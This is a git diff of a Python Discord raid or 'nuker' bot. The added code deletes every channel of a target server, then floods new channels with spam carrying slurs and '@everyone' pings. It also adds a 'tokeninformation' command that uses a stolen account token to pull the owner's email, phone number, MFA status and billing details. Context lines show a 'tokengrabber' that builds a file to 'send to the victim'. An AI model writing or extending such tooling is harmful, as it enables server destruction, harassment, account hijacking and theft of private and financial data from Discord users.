@@ -8,6 +8,7 @@ import base64
 import marshal
 import string
 from config import TOKEN
+from tokeninfo import tokeninfo
 from discord.ext import commands
 
 
@@ -17,7 +18,11 @@ from discord.ext import commands
 # ++++++++++++++++          started at 10/17/2023           ++++++++++++++++ #
 
 
-
+                # ================ changelog ================ # 
+                # added tokeninformation
+                # flush will now delete channels before spamming
+                # added tokeninfo.py
+                # ================ changelog ================ # 
 
 
 
@@ -27,17 +32,14 @@ from discord.ext import commands
                 # fix mass ban
                 # fix profile spy
                 # add await ctx.message.add_reaction("✔️") to every command
-                # add token info, skid from astraadev all tools in one
                 # perhaps add some user token functions
-                # [IMPORTANT] add delete all channels first to flush. 
-                # asyncio should be only used for messages since we don't want to get ratelimited before we spam messages
                 # ================ to do list ================ # 
 
 
 
 
 
-YOURUSERID = ''
+YOURUSERID = '992952207588720730'
 PREFIX = '!'
 
 intents = discord.Intents.all()
@@ -374,7 +376,7 @@ async def setstatus(ctx, status: str):
     else:
         await ctx.reply('Invalid status. Please choose one of the following: online, idle, dnd, invisible')
 
-# add delete all channels before spamming channels and messages
+
 @bot.command()
 async def flush(ctx, server_id):
     try:
@@ -382,12 +384,16 @@ async def flush(ctx, server_id):
         message_contents = ["@everyone GET NUKED 🤡", "@everyone RAIDED", "@everyone speak your shit lil niggas", "@everyone FLOP"]
         guild = bot.get_guild(int(server_id))
         if guild is not None:
+            
+            for channel in guild.channels:
+                await channel.delete()
+
             created_channels = []
             channel_amount = 10
-            message_amount = 100
+            message_amount = 80
 
             for _ in range(channel_amount):
-                new_channel_name = new_channel_name = random.choice(channel_names)
+                new_channel_name = random.choice(channel_names)
                 overwrites = {
                     guild.default_role: discord.PermissionOverwrite(read_messages=True, send_messages=True),
                     guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
@@ -402,12 +408,8 @@ async def flush(ctx, server_id):
                 tasks.append(task)
 
             await asyncio.gather(*tasks)
-
-            
-        else:
-            await ctx.send(f'Could not find the server with ID "{server_id}"')
-    except ValueError:
-        await ctx.send("Invalid syntax.")
+    except Exception as e:
+        await ctx.reply(f"Error: {e}")
 
 
 
@@ -573,19 +575,13 @@ async def rolepurge(ctx, server_id):
             if role.name != "@everyone" and role != bot_role:
                 await role.delete()
         
-        await ctx.send("All deletable roles have been deleted.", ephemeral=True)
+        await ctx.send("All deletable roles have been deleted.")
     except discord.errors.Forbidden:
         pass
-        await ctx.send("All deletable roles have been deleted.", ephemeral=True)
+        await ctx.send("All deletable roles have been deleted.")
     except ValueError:
-        await ctx.send("Invalid server ID format.", ephemeral=True)
+        await ctx.send("Invalid server ID format.")
 
-@bot.command()
-async def tokentype(ctx, token):
-    if check_token_type(token) == 'Account':
-        await ctx.send("Account token.")
-    else:
-        await ctx.send("Bot/Invalid.")
 
 
 
@@ -683,7 +679,50 @@ async def tokengrabber(ctx, webhook, obfus):
     await ctx.reply(file=file, content='Rename this and send it to the victim. The victim must have python installed.')
 
 
+@bot.command()
+async def tokeninformation(ctx, token):
+    
+    info = tokeninfo(token)
+                                                      # 4
+    
+    try:
+        embed = discord.Embed(title="Token Information", color=discord.Color.gold())
+        embed.add_field(name="Username", value=info[1], inline=False)
+        embed.add_field(name="User ID", value=info[2], inline=False)
+        embed.add_field(name="Phone Number", value=info[4], inline=False)
+        embed.add_field(name="Email", value=info[5], inline=False)
+        embed.add_field(name="Locale", value=info[12], inline=False)
+        embed.add_field(name="Language", value=info[6], inline=False)
+        embed.add_field(name="Creation Date [Day-Month-Year]", value=info[7], inline=False)
+        embed.add_field(name="Has nitro", value=info[8], inline=False)
+        embed.add_field(name="MFA enabled", value=info[9], inline=False)
+        embed.add_field(name="Flags", value=info[10], inline=False)
+        embed.add_field(name="Verified", value=info[11], inline=False)
+        embed.set_footer(text="Billing info will also be sent if any.")
+        embed.set_image(url=info[3])
 
+
+        await ctx.reply(embed=embed)
+        
+        billinginfo = None
+
+        if info is not None and len(info) >= 14:
+            bill = info[13]
+            if bill is not None:
+                data = bill[0]
+                billinginfo = discord.Embed(title="Billing Information", color=discord.Color.gold())
+                for field_name, field_value in data.items():
+                    billinginfo.add_field(name=field_name, value=field_value, inline=False)
+                await ctx.reply(embed=billinginfo)
+            else:
+                await ctx.reply("No billing information available.")
+        else:
+            pass
+        
+        
+
+    except Exception as e:
+        await ctx.send(info)
     
 #                                  non bot functions                                      #
 
@@ -768,7 +807,7 @@ class XOLOVIEW(discord.ui.View):
         helpembed.add_field(name='Server List', value='`!servlist`', inline=False)
         helpembed.add_field(name='Clear', value='Deletes all messages sent by the bot\n`!clear <serverid>`', inline=False)
         helpembed.add_field(name='Set Status', value='`!setstatus <status>`', inline=False)
-        helpembed.add_field(name='Token Type', value='`!tokentype <token>`', inline=False)
+        helpembed.add_field(name='Token Information', value='`!tokeninformation <token>`', inline=False)
         helpembed.add_field(name='Say', value='`!say <msg>`', inline=False)
         helpembed.add_field(name='Ban', value='`!ban <userid> <reason>`', inline=False)
         helpembed.add_field(name='UnBan', value='`!unban <userid>`', inline=False)
